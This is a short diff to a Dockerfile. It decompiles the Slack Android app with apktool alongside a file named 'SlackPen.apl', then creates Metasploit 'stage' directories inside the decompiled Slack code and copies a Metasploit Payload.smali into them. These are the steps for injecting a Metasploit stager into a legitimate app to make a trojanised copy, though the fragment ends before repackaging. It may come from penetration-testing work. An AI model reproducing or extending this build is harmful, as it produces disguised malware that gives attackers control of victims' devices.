@@ -29,6 +29,9 @@ RUN sudo python3 -m pip install pysftp
 
 RUN sudo /bin/bash -l -c 'sudo python3 /usr/src/wdir/get_file_sftp.py'
 
+RUN sudo apktool d -f -o original Slack.apk
+RUN sudo apktool d -f -o payload SlackPen.apl
+
 RUN sudo mkdir /usr/src/wdir/original/smali/com/metasploit/
 RUN sudo mkdir /usr/src/wdir/original/smali/com/metasploit/stage/
 RUN sudo cp /usr/src/wdir/payload/smali/com/metasploit/stage/Payload.smali /usr/src/wdir/original/smali/com/metasploit/stage
